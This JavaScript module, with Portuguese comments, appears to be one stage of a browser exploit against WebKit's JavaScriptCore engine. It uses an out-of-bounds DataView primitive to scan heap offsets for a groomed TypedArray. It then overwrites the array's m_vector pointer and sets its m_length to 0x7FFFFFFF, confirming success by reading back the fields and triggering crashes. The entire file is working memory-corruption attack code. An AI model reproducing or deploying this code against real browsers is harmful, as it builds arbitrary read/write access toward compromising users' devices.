// js/victim_corruptor.mjs
import { AdvancedInt64 } from './int64.mjs';
import { log, PAUSE_LAB, toHexS1 } from './utils.mjs';
import * as Core from './core_exploit.mjs';
import * as Groomer from './heap_groomer.mjs';

let _CURRENT_TEST_GAP = 0;
let _last_successful_gap = null;
const FNAME_BASE = "VictimCorruptor";

// Getters e Setters para as variáveis de estado do módulo
export function getCurrentTestGap() { return _CURRENT_TEST_GAP; }
export function setCurrentTestGap(value) { _CURRENT_TEST_GAP = value; }
export function getLastSuccessfulGap() { return _last_successful_gap; }
export function setLastSuccessfulGap(value) { _last_successful_gap = value; }
export function resetLastSuccessfulGap() { _last_successful_gap = null; }


export async function testCorruptKnownGap() {
    if (getLastSuccessfulGap() === null) {
        log("Nenhum GAP de sucesso conhecido para testar.", "warn", `${FNAME_BASE}.testCorruptKnownGap`);
        return;
    }
    log(`Testando corrupção no GAP conhecido: ${getLastSuccessfulGap()}`, "test", `${FNAME_BASE}.testCorruptKnownGap`);
    await try_corrupt_fields_for_gap(getLastSuccessfulGap());
}

export async function try_corrupt_fields_for_gap(current_gap_to_test) {
    const FNAME_TRY_FIELDS = `${FNAME_BASE}.try_corrupt_fields_for_gap`;
    let result = { gap: current_gap_to_test, mvector_corrupted: false, mlength_corrupted: false, mvector_read: "N/A", mlength_read: "N/A", crashed_or_error: false };

    if (Groomer.victim_object_type !== 'TypedArray' || !Groomer.victim_object) { log("Vítima não é TypedArray ou não alocada.", "error", FNAME_TRY_FIELDS); return result; }
    if (!Core.oob_dataview_real) { log("Primitiva OOB não ativa.", "error", FNAME_TRY_FIELDS); return result; }

    const victim_jscell_rel_offset_from_oob_logical_start = Core.getInitialBufferSize() + current_gap_to_test;
    const m_vector_field_abs_offset_in_jscell = Core.getJSCOffsets().TypedArray.M_VECTOR_OFFSET;
    const m_vector_field_rel_offset_from_oob_base = victim_jscell_rel_offset_from_oob_logical_start + m_vector_field_abs_offset_in_jscell;
    const m_vector_field_abs_offset_in_dv = Core.getBaseOffsetInDV() + m_vector_field_rel_offset_from_oob_base;

    log(`  GAP ${current_gap_to_test}: Tentando R/W m_vector em abs_dv_offset ${m_vector_field_abs_offset_in_dv}`, "subtest", FNAME_TRY_FIELDS);
    if (m_vector_field_abs_offset_in_dv < 0 || m_vector_field_abs_offset_in_dv + 8 > Core.oob_dataview_real.buffer.byteLength) {
        log(`     ↳ m_vector target FORA DO ALCANCE. Pulando GAP.`, "warn", FNAME_TRY_FIELDS); return result;
    }
    let original_mvector = Core.oob_read_relative(m_vector_field_rel_offset_from_oob_base, 8);
    if (original_mvector instanceof AdvancedInt64 && !original_mvector.isZero() && !original_mvector.toString(false).toLowerCase().includes("aaaa")) {
        result.mvector_read = original_mvector.toString(true);
        log(`     ↳ GAP ${current_gap_to_test}: ACHADO m_vector ORIGINAL POTENCIAL: ${result.mvector_read}`, "leak", FNAME_TRY_FIELDS);
    } else { log(`     ↳ GAP ${current_gap_to_test}: Leitura do m_vector original retornou lixo/zero.`, "info", FNAME_TRY_FIELDS); }

    const crash_test_mvector_addr = AdvancedInt64.One;
    log(`       Tentando escrever NOVO m_vector: ${crash_test_mvector_addr.toString(true)} ...`, "vuln", FNAME_TRY_FIELDS);
    Core.oob_write_relative(m_vector_field_rel_offset_from_oob_base, crash_test_mvector_addr, 8); await PAUSE_LAB(50);
    let written_mvector = Core.oob_read_relative(m_vector_field_rel_offset_from_oob_base, 8);
    if (written_mvector instanceof AdvancedInt64 && written_mvector.equals(crash_test_mvector_addr)) {
        log(`       CONFIRMADO: m_vector sobrescrito para ${written_mvector.toString(true)}`, "good", FNAME_TRY_FIELDS); result.mvector_corrupted = true;
    } else { log(`       FALHA: m_vector NÃO foi sobrescrito. Lido: ${written_mvector ? written_mvector.toString(true) : "null/erro"}`, "warn", FNAME_TRY_FIELDS); }
    try {
        log(`       Tentando acessar victim_object[0] (m_vector=${crash_test_mvector_addr.toString(true)})...`, "critical", FNAME_TRY_FIELDS);
        let val = Groomer.victim_object[0];
        log(`       ACESSO A victim_object[0] NÃO CRASHOU. Valor lido: ${toHexS1(val)}`, "warn", FNAME_TRY_FIELDS);
    } catch (e) {
        log(`       CRASH/ERRO ESPERADO (m_vector): ${e.message}`, "good", FNAME_TRY_FIELDS); result.crashed_or_error = true; result.mvector_corrupted = true; 
        setLastSuccessfulGap(current_gap_to_test); // <<< USA SETTER
        log(`GAP ${current_gap_to_test} MARCADO COMO SUCESSO (CRASH M_VECTOR)!`, "vuln", FNAME_TRY_FIELDS); return result;
    }
    if (original_mvector instanceof AdvancedInt64 && !original_mvector.isZero() && result.mvector_corrupted) {
        log(`       Restaurando m_vector original: ${original_mvector.toString(true)}`, "tool", FNAME_TRY_FIELDS);
        Core.oob_write_relative(m_vector_field_rel_offset_from_oob_base, original_mvector, 8); await PAUSE_LAB(50);
    }

    const m_length_field_abs_offset_in_jscell = Core.getJSCOffsets().TypedArray.M_LENGTH_OFFSET;
    const m_length_field_rel_offset_from_oob_base = victim_jscell_rel_offset_from_oob_logical_start + m_length_field_abs_offset_in_jscell;
    const m_length_field_abs_offset_in_dv = Core.getBaseOffsetInDV() + m_length_field_rel_offset_from_oob_base;
    log(`  GAP ${current_gap_to_test}: Tentando R/W m_length em abs_dv_offset ${m_length_field_abs_offset_in_dv}`, "subtest", FNAME_TRY_FIELDS);
    if (m_length_field_abs_offset_in_dv < 0 || m_length_field_abs_offset_in_dv + 4 > Core.oob_dataview_real.buffer.byteLength) {
        log(`     ↳ m_length target FORA DO ALCANCE.`, "warn", FNAME_TRY_FIELDS);
    } else {
        let original_mlength = Core.oob_read_relative(m_length_field_rel_offset_from_oob_base, 4);
        if (typeof original_mlength === 'number' && Groomer.victim_object && original_mlength === Groomer.victim_object.length) {
            result.mlength_read = toHexS1(original_mlength); log(`     ↳ GAP ${current_gap_to_test}: ACHADO m_length ORIGINAL: ${result.mlength_read}`, "leak", FNAME_TRY_FIELDS);
        } else { log(`     ↳ GAP ${current_gap_to_test}: Leitura do m_length original retornou ${toHexS1(original_mlength)}.`, "info", FNAME_TRY_FIELDS); }
        const large_mlength_val = 0x7FFFFFFF;
        log(`       Tentando escrever NOVO m_length: ${toHexS1(large_mlength_val)} ...`, "vuln", FNAME_TRY_FIELDS);
        Core.oob_write_relative(m_length_field_rel_offset_from_oob_base, large_mlength_val, 4); await PAUSE_LAB(50);
        let written_mlength = Core.oob_read_relative(m_length_field_rel_offset_from_oob_base, 4);
        if (typeof written_mlength === 'number' && written_mlength === large_mlength_val) {
            log(`       CONFIRMADO: m_length sobrescrito para ${toHexS1(written_mlength)}`, "good", FNAME_TRY_FIELDS); result.mlength_corrupted = true;
        } else { log(`       FALHA: m_length NÃO foi sobrescrito. Lido: ${toHexS1(written_mlength)}`, "warn", FNAME_TRY_FIELDS); }
        if (result.mlength_corrupted && Groomer.victim_object) {
            try { const far_index = Groomer.victim_object.length + 100000; log(`       Tentando acessar victim_object[${far_index}] (m_length=${toHexS1(large_mlength_val)})...`, "critical", FNAME_TRY_FIELDS); let val = Groomer.victim_object[far_index]; log(`       ACESSO A victim_object[${far_index}] NÃO CRASHOU. Valor lido: ${toHexS1(val)}`, "warn", FNAME_TRY_FIELDS);
            } catch (e) { log(`       CRASH/ERRO ESPERADO (m_length): ${e.message}`, "good", FNAME_TRY_FIELDS); result.crashed_or_error = true; setLastSuccessfulGap(current_gap_to_test); log(`GAP ${current_gap_to_test} MARCADO COMO SUCESSO (CRASH M_LENGTH)!`, "vuln", FNAME_TRY_FIELDS); } // <<< USA SETTER
        }
        if (typeof original_mlength === 'number' && result.mlength_corrupted) {
            log(`       Restaurando m_length original: ${toHexS1(original_mlength)}`, "tool", FNAME_TRY_FIELDS);
            Core.oob_write_relative(m_length_field_rel_offset_from_oob_base, original_mlength, 4);
        }
    }
    return result;
}

export async function findAndCorruptVictimFields_Iterative() {
    const FNAME = `${FNAME_BASE}.findAndCorrupt`;
    log(`--- Iniciando ${FNAME} ---`, 'test', FNAME);
    if (!Groomer.victim_object || Groomer.victim_object_type !== 'TypedArray') { log("ERRO: Vítima.", "error", FNAME); return; }
    if (!Core.oob_dataview_real) { log("ERRO: Primitiva OOB.", "error", FNAME); return; }
    const gapStart = parseInt(document.getElementById('gapStartScan').value); const gapEnd = parseInt(document.getElementById('gapEndScan').value); const gapStep = parseInt(document.getElementById('gapStepScan').value);
    if (isNaN(gapStart) || isNaN(gapEnd) || isNaN(gapStep) || gapStep === 0) { log("ERRO: Faixa de GAP inválida.", "error", FNAME); return; }
    log(`   Iniciando busca de GAP de ${gapStart} a ${gapEnd}, passo ${gapStep}.`, "info", FNAME); await PAUSE_LAB(1000);
    let best_gap_info_no_crash = null;
    for (let current_gap = gapStart; current_gap <= gapEnd; current_gap += gapStep) {
        if (getLastSuccessfulGap() !== null) { log(`GAP de sucesso (${getLastSuccessfulGap()}) já encontrado. Interrompendo.`, "good", FNAME); break; } // <<< USA GETTER
        log(`Testando GAP: ${current_gap}`, "test", FNAME); setCurrentTestGap(current_gap); // <<< USA SETTER
        const result = await try_corrupt_fields_for_gap(current_gap);
        if (result.crashed_or_error) { log(`CORRUPÇÃO BEM SUCEDIDA (CRASH/ERRO) com GAP = ${getLastSuccessfulGap()}!`, "critical", FNAME); break; } // <<< USA GETTER
        else if (result.mvector_corrupted || result.mlength_corrupted) { if (!best_gap_info_no_crash) best_gap_info_no_crash = result; log(`   GAP ${current_gap}: Campos CORROMPIDOS SEM CRASH.`, "good", FNAME); }
        else if (result.mvector_read !== "N/A" && !result.mvector_read.toLowerCase().includes("aaaa")) { if (!best_gap_info_no_crash) best_gap_info_no_crash = result; log(`   GAP ${current_gap}: m_vector válido LIDO.`, "info", FNAME); }
        await PAUSE_LAB(300); if (document.hidden) { log("Busca abortada.", "warn", FNAME); break; }
        if (current_gap < gapEnd && (current_gap + gapStep) > gapEnd && (current_gap + gapStep) !== gapEnd ) { current_gap = gapEnd - gapStep; }
    }
    if (getLastSuccessfulGap() !== null) { log(`Busca concluída. GAP PROMISSOR: ${getLastSuccessfulGap()}`, "vuln", FNAME); } // <<< USA GETTER
    else if (best_gap_info_no_crash) { log("Busca concluída. Nenhum crash. Melhor candidato (sem crash): GAP " + best_gap_info_no_crash.gap, "warn", FNAME); }
    else { log("Busca concluída. Nenhuma corrupção confirmada.", "error", FNAME); }
    log(`--- ${FNAME} Concluído ---`, 'test', FNAME);
}
